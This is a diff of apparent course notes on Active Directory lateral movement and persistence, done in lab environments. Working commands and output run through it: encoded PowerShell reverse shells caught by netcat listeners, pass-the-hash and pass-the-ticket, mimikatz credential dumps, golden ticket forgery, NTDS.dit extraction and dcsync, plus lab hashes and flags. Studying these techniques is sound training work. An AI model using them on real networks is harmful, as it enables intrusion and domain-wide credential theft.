@@ -87,7 +87,7 @@ To create a proc on the remote WMI target, we need creds for a member of the loc
 We previously encountered [UAC remote restrictions](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction#domain-user-accounts-active-directory-user-account) in non-domain member systems in the Password Attacks Module, but this restriction does not apply to domain users, therefore we can utilize full privs while moving laterally with the techniques shown here.
 
 `wmic` has historically been abused for lateral movement through CLI by specifying the target IP to arg `/node:`, user `/user:`, and password `/password:`.  We'll instruct wmic to launch calculator with the `process call create` keywords, test the command by connecting as `jeff` on CLIENT74.
-```
+```powershell
 C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
 Executing (Win32_Process)->Create()
 Method execution successful.
@@ -123,12 +123,12 @@ $command = 'calc';
 ```
 
 Finally we tie the args together by issuing the `Invoke-CimMethod` cmdlet, supplying the `Win32_Process` and `Create` as `-ClassName` and `-MethodName`.
-```
+```bash
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
 ```
 
 To simulate we can connect to CLIENT74 as `jeff` and run the above powershell.
-```
+```powershell
 PS C:\Users\jeff> $username = 'jen';
 ...
 PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
@@ -159,14 +159,14 @@ print(cmd)
 ```
 
 Save and run the script, retrieve the output for later use.
-```
+```bash
 kali@kali:~$ python3 encode.py
 powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
 OwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 ```
 
 Setup a Netcat listener on port 443 of our attacking machine, run the PowerShell WMI script  with the encoded rev shell payload.
-```
+```powershell
 PS C:\Users\jeff> $username = 'jen';
 PS C:\Users\jeff> $password = 'Nexus123!';
 PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
@@ -186,7 +186,7 @@ ProcessId ReturnValue PSComputerName
 ```
 - The output indicates success.
 - Confirm by switching to our listener.
-```
+```bash
 kali@kali:~$ nc -lnvp 443
 listening on [any] 443 ...
 connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 49855
@@ -204,7 +204,7 @@ An alternative to WMI is WinRM, which can also be used for remote host managemen
 WinRM is implemented in many built-in utils, [winrs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) (Windows Remote Shell), in addition to the PowerShell implementation.
 
 We can invoke the `winrs` utility by specifying the target host though the `-r:` arg and the username/password with `-u:`/`-p:`, last we specify the commands to exec on the remote host.  Note `winrs` ony works for domain users, so we exec the command as `jeff` on CLIENT74, providing creds for `jen` as args.
-```
+```powershell
 C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
 FILES04
 corp\jen
@@ -214,13 +214,13 @@ corp\jen
 *For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.*
 
 To achieve lateral movement, we just need to replace the test command with the base64 enc rev shell payload we created earlier.
-```
+```powershell
 C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
 HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
 ```
 
 Returning to our listener, we are greeted with a rev shell from FILES04.
-```
+```bash
 kali@kali:~$ nc -lnvp 443
 listening on [any] 443 ...
 connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 65107
@@ -231,7 +231,7 @@ corp\jen
 ```
 
 PowerShell has built-in WinRM capabilities, [PowerShell remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2), that can be invoked by the new-PSSession cmdlet.  The target IP and creds in a credentials object are provided similar to before.
-```
+```powershell
 PS C:\Users\jeff> $username = 'jen';
 PS C:\Users\jeff> $password = 'Nexus123!';
 PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
@@ -244,7 +244,7 @@ PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credent
   1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available
 ```
 - To interact with session ID 1, issue `Enter-PSSession` followed by sess ID.
-```
+```powershell
 PS C:\Users\jeff> Enter-PSSession 1
 [192.168.50.73]: PS C:\Users\jen\Documents> whoami
 corp\jen
@@ -257,7 +257,7 @@ FILES04
 ###### Labs
 
 Launch VM Group 2 and once connected as jeff on client74 and try to move laterally to web04 in order to get the flag located on the administrator's desktop.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ ./ps-rev-shell.py "192.168.45.240" 443
 powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
@@ -344,7 +344,7 @@ To achieve remote command exec, PsExec performs the following:
 Let's assume we have RDP access as local admin `offsec` on CLIENT74, we can run the 64-bit version of PsExec from `C:\Tools\SysinternalsSuite`.
 
 To start an interactive session on the remote host we invoke `PsExec64.exe` with arg `-i`, followed by target hostname which is prepended with `\\`.  Specify `corp\jen` as domain\username and `Nexus123!` as password with `-u`/`-p`.  Finally we include the command for remote exec, a cmd shell in this case.
-```
+```powershell
 PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
 
 PsExec v2.4 - Execute processes remotely
@@ -367,7 +367,7 @@ corp\jen
 
 Start VM Group 2 and connect as the offsec user on client74. Then try to use PsExec to move laterally to web04 in order to get the flag located on jen's desktop.
 (*NOTE: VM group client was not responding, used Kali)*
-```
+```bash
 ┌──(operator㉿labhost)-[~]
 └─$ impacket-psexec corp.com/jen:'Nexus123!'@192.168.207.72 cmd
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -405,7 +405,7 @@ The technique also requires the admin share `ADMIN$` to be available.  To establ
 PtH uses the NTLM hash legitimately, the vuln lies in the fact that we gain unauthorized access to the password hash of a local admin.
 
 To demonstrate, we can use `wmiexec` from the Impacket suite on Kali against the local admin account on FILES04.  We will invoke the command by passing the local admin hash we obtained in the previous module, then specify the username along with the target IP.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.248.73
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -428,7 +428,7 @@ This method works on AD domain accounts and built-in local admin account.  Due t
 ###### Labs
 
 Start VM Group 2 and try to execute the pass the hash technique to move laterally to web04 to get the flag located on the administrator's desktop.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.248.72
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -462,14 +462,14 @@ Using [overpass the the hash](https://www.blackhat.com/docs/us-14/materials/us-1
 In this example assume we have compromised a workstation or server that `jen` has authenticated to.  Also assume the machine has cached their creds and NTLM hash.
 
 To simulate this, we can login to CLIENT76, a Win 10 sys, as `jeff` and run a proc as `jen`, which will prompt for auth.
-```
+```powershell
 PS C:\Users\jeff> runas.exe /user:jen@corp.com cmd.exe
 Enter the password for jen@corp.com:
 Attempting to start cmd.exe as user "jen@corp.com" ...
 ```
 
 We can validate this with `mimikatz` using `sekurlsa::logonpasswords` from an admin shell, which will dump hashed passwords.
-```
+```powershell
 PS C:\Tools> .\mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
@@ -546,7 +546,7 @@ The command take several args and creates a PowerShell proc in the context `jen`
 - `/domain:corp.com`
 - `/ntlm:369def79d8372408bf6e93364cc93075`
 - `/run:powershell`
-```
+```bash
 mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
 user    : jen
 domain  : corp.com
@@ -574,7 +574,7 @@ We now have a PS session allowing us to exec commands as `jen`.
 *At this point, running the whoami command on the newly created PowerShell session would show jeff's identity instead of jen. While this could be confusing, this is the intended behavior of the whoami utility which only checks the current process's token and it does not inspect any imported kerberos tickets*
 
 List the cached Kerberos tickets with `klist`
-```
+```powershell
 PS C:\Windows\system32> whoami
 corp\jeff
 PS C:\Windows\system32> klist
@@ -586,7 +586,7 @@ Cached Tickets: (0)
 - There are no cached kerberos tickets, which is expected since `jen` has not performed an interactive login.
 
 We can generate a TGT by connecting to a network share on FILES04 with `net use`.
-```
+```powershell
 PS C:\Windows\system32> net use \\files04
 The command completed successfully.
 
@@ -628,7 +628,7 @@ Now that our NTLM hash has been converted into Kerberos TGT, we can use any tool
 PsExec can run a command remotely but does not accept password hashes, since we have generated Kerberos tickets and are operating in the context of `jen` in PS, we can reuse the TGT to obtain code exec on FILES04.
 
 Let's test that out by running `.\PsExec.exe` to launch `cmd` remotely on `\\files04` sys as `jen`.
-```
+```powershell
 PS C:\Windows\system32> cd C:\Tools\SysinternalsSuite\
 PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
 
@@ -651,7 +651,7 @@ FILES04
 ###### Labs
 
 Start VM Group 2 and try to execute the overpass the hash technique to move laterally to web04 to get the flag located on the Administrator's desktop. To do so, connect to CLIENT76 via RDP as the offsec user and use the NTLM hash obtained in a previous Module.
-```
+```bash
 mimikatz # sekurlsa::pth /user:administrator /domain:corp.com /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
 user    : administrator
 domain  : corp.com
@@ -738,7 +738,7 @@ In this example we will abuse an existing session of user `dave`.  The user `dav
 To demonstrate the attack, we will extract the current TGT/TGS from memory and inject user `dave` WEB04 TGS into our own session, allowing us to access the restricted folder.
 
 Log in to CLIENT76 as `jen` and verify that we are unable to access the WEB04 resources.  We'll try to list the content of `\\web04\backup` folder from the admin PowerShell command line.
-```
+```powershell
 PS C:\Users\jen> whoami
 corp\jen
 PS C:\Users\jen> ls \\web04\backup
@@ -754,7 +754,7 @@ At line:1 char:1
 - Confirmed that `jen` has no access.
 
 Now we can use Mimikatz to enable debug privs and export all the TGT/TGS from memory with `sekrulsa::tickets /export`.
-```
+```bash
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -842,7 +842,7 @@ SID               : S-1-5-21-1987370270-658905905-1781884369-1103
 Inspecting the tickets indicates that `dave` initiated a session, we can now try to inject one of those tickets into `jen` session.
 
 Verify the newly created tickets with `dir` filtering the `kirbi` extension.
-```
+```powershell
 PS C:\Tools> dir *.kirbi
 
 
@@ -897,14 +897,14 @@ Mode                LastWriteTime         Length Name
 -a----       12/27/2023   5:15 PM           1521 [0;ddd5a]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
 ```
 - We can pick any of the TGS `dave@cifs-web04.kirbi` tickets and inject them with the `kerberos::ptt` command.
-```
+```bash
 mimikatz # kerberos::ptt [0;1204cf]-0-0-40810000-dave@cifs-web04.kirbi
 
 * File: '[0;1204cf]-0-0-40810000-dave@cifs-web04.kirbi': OK
 ```
 - We have no errors and we should now have this ticket in our session.
  - Confirm by running `klist`
-```
+```powershell
 PS C:\Tools> klist
 
 Current LogonId is 0:0xb01ba
@@ -925,7 +925,7 @@ Cached Tickets: (1)
 - The `dave` ticket has been imported into our `jen` user session.
 
 Confirm we have been granted access to the restricted share folder.
-```
+```powershell
 PS C:\Tools> ls \\web04\backup
 
 
@@ -974,7 +974,7 @@ $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
 Once the two PS commands have been executed on CLIENT74 we should have spawned an instance of calulator app.
 
 Since it is in Session 0, we can verify the calc app is running with `tasklist` and filtering with `findstr`.
-```
+```powershell
 C:\Users\Administrator>tasklist | findstr "calc"
 win32calc.exe                 4764 Services                   0     12,132 K
 ```
@@ -988,7 +988,7 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
 ```
 
 Catch the shell from Kali with a Netcat listener.
-```
+```bash
 kali@kali:~$ nc -lnvp 443
 listening on [any] 443 ...
 connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 50778
@@ -1004,7 +1004,7 @@ FILES04
 ###### Labs
 
 Start VM Group 2 and connect as the jen user on client74 then try to abuse DCOM to move laterally to web04 to get the flag located on the administrator's desktop.
-```
+```bash
 ┌──(operator㉿labhost)-[~]
 └─$ impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E corp.com/Administrator@192.168.212.72
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -1063,7 +1063,7 @@ In fact the password is only changed when functional level of the domain is upgr
 *The Domain Functional Level dictates the capabilities of the domain and determines which Windows operating systems can be run on the domain controller. Higher functional levels enable additional features, functionality, and security mitigations.*
 
 To test this technique we will attempt to move laterally from Win 11 CLIENT74 to the DC with PsExec as `jen` by spawning a traditional shell with `cmd`.  This fails because we do not have proper perms.
-```
+```powershell
 PS C:\Users\jen> cd C:\Tools\SysinternalsSuite\
 PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\DC1 cmd.exe
 
@@ -1080,7 +1080,7 @@ At this stage, the Golden Ticket will require us to have access to a Domain Admi
 With this level of access we can extract the password hash of the `krbtgt` account with Mimikatz.
 
 To simulate this we'll log in to the DC via RDP using `jeffadmin` account, run Mimikatz, and issue `lsadump::lsa`.
-```
+```bash
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -1111,7 +1111,7 @@ Creating the Golden Ticket and injecting it into memory does not require admin p
 On CLIENT74 as `jen`, before we generate the GT, launch Mimikatz and delete any existing Kerbersos tickets `kerberos::purge`.
 
 Supply the domain SID, which can be obtained with `whoami /user`, to the Mimikatz `kerberos::golden` command to create a GT.
-```
+```powershell
 PS C:\Users\jen> whoami /user
 
 USER INFORMATION
@@ -1123,7 +1123,7 @@ corp\jen  S-1-5-21-1987370270-658905905-1781884369-1124
 ```
 
 This time we use the `/krbtgt` option instead of `/rc4` to indicate we are supplying the `krbtgt` password hash.  As of July 2022, we need to provide an existing account, so we will set the GT username to `jen`.
-```
+```bash
 mimikatz # kerberos::purge
 Ticket(s) purge for current session is OK
 
@@ -1158,7 +1158,7 @@ Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF695F1B800
    - Including Domain Admins.
 
 The ticket has been injected into memory and we launched a new command prompt with `misc::cmd` from which we attempt lateral movement with `PsExec`.
-```
+```powershell
 C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe
 
 PsExec v2.4 - Execute processes remotely
@@ -1211,7 +1211,7 @@ Mandatory Label\High Mandatory Level        Label            S-1-16-12288
  - Listing group memberships shows we are now a member of multiple powerfull groups.
 
 Note, by creating our own TGT and using PsExec we are performing the OPtH attack, leveraging Kerberos auth as we discussed earlier.  If we had connecting PsExec to the IP address of the DC instead of the hostname, we would force the use of NTLM auth and access would be blocked as shown.
-```
+```powershell
 C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe
 
 PsExec v2.4 - Execute processes remotely
@@ -1225,7 +1225,7 @@ Access is denied.
 ###### Labs
 
 Start VM Group 2 and try to execute the golden ticket persistence technique to get access to DC1 and get the flag located on the administrator's desktop.
-```
+```bash
 mimikatz # kerberos::purge
 Ticket(s) purge for current session is OK
 
@@ -1302,7 +1302,7 @@ As a Domain Admin, we can abuse vshadow utility to create a Shadow Copy that wil
 
 To start, connect as `jeffadmin` domain admin user to the DC1 domain controller and launch `vshadow` utility from an elevated prompt with the `-nw` option to disable [writers](https://learn.microsoft.com/en-us/windows/win32/vss/shadow-copy-creation-details), which speeds up backup creation and include the `-p` option to store the copy on disk.
 *NOTE: Must use elevated CMD prompt, not PS*
-```
+```powershell
 C:\Tools> .\vshadow.exe -nw -p C:
 
 VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
@@ -1343,19 +1343,19 @@ Snapshot creation done.
 	- `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`
 
 Now we copy the whole AD database from the shadow copy to the `C:` drive root folder by specifying the shadow copy device name and appending the full `ntds.dit` path.
-```
+```powershell
 C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
         1 file(s) copied.
 ```
 
 The last item required, to extract the content of the `ntds.dit` we need to save the SYSTEM hive from the Windows registry.  We can use the `reg` utility and the `save` arg.
-```
+```powershell
 C:\Tools>reg.exe save hklm\system c:\system.bak
 The operation completed successfully.
 ```
 
 We can now transfer the two `.bak` files to our Kali machine and continue exracting the credentials with the `secretsdump` tool from the impacket suite.  We'll supply the ntds DB and the system hive via `-ntds` and `-system` along with the `LOCAL` keyword to parse the files locally.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -1443,7 +1443,7 @@ These persistence techniques could be employed during pentests or red team exerc
 ###### Labs
 
 Capstone Exercise: Start VM Group 2 and try to execute the dcsync technique and get access to dc1 in order to get the flag located on the administrator's desktop. To do so, log in via RDP as the jeffadmin and perform dcsync against the domain Administrator user to obtain its NTLM hash.
-```
+```bash
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -1486,7 +1486,7 @@ OS{8daf90aaa93783fbd8a51c9dbf5a9823}
 ```
 
 Capstone Exercise: Once VM Group 3 is started, the domain corp.com has been modified. Log in as leon on CLIENT74 and use the techniques discussed in this Module to move laterally and get the flag on FILES04 Administrator's desktop.
-```
+```bash
 ┌──(operator㉿labhost)-[~]
 └─$ crackmapexec smb 192.168.206.74 -u capstone3.txt -p 'HomeTaping199!' -d corp.com --continue-on-success
 
